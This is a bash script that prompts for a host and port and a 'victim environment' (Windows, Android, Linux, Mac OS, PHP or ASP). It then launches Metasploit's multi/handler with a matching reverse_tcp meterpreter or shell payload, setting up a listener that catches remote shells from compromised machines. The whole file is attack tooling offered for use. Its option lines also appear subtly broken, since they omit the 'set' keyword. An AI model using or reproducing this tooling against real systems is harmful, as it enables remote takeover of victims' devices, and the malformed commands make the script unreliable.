#!/bin/bash
# Coded By Omar Salloum #
#     Date 2\10\2016    #
#########################
echo " Please Re-enter The HOST And PORT Again : "
echo " $( tput setaf 10)>$(tput sgr0)$(tput bold)$( tput setaf 4) Your HOST : $(tput sgr0)$(tput bold)"
read LHOST
echo " $( tput setaf 10)>$(tput sgr0)$(tput bold)$( tput setaf 4) Your PORT : $(tput sgr0)$(tput bold)"
read PORT
echo " $( tput setaf 10)>$(tput sgr0)$(tput bold)$( tput setaf 4) Select The Victim Environment : $(tput sgr0)$(tput bold)"
echo ""
echo " $( tput setaf 10)1 .$(tput sgr0)$(tput bold)$( tput setaf 4) Windows $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)2 .$(tput sgr0)$(tput bold)$( tput setaf 4) Android $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)3 .$(tput sgr0)$(tput bold)$( tput setaf 4) Linux $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)4 .$(tput sgr0)$(tput bold)$( tput setaf 4) Mac OS $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)5 .$(tput sgr0)$(tput bold)$( tput setaf 4) PHP Web Payload $(tput sgr0)$(tput bold)"
echo " $( tput setaf 10)6 .$(tput sgr0)$(tput bold)$( tput setaf 4) ASP Web Payload $(tput sgr0)$(tput bold)"
read number
echo " "
echo " $( tput setaf 10)~$(tput sgr0)$(tput bold)$( tput setaf 4) Pleas Wait .. $(tput sgr0)$(tput bold)"
echo " "
case "$number" in 
'1') 
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; LHOST=$LHOST; LPORT=$PORT; run" ;;
'2')
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; LHOST=$LHOST; LPORT=$PORT; run" ;;
'3')
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; LHOST=$LHOST; LPORT=$PORT; run" ;;
'4')
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD osx/x86/shell_reverse_tcp; LHOST=$LHOST; LPORT=$PORT; run" ;;
'5')
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD php/meterpreter_reverse_tcp; LHOST=$LHOST; LPORT=$PORT; run" ;;
'6')
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; LHOST=$LHOST; LPORT=$PORT; run" ;;
esac


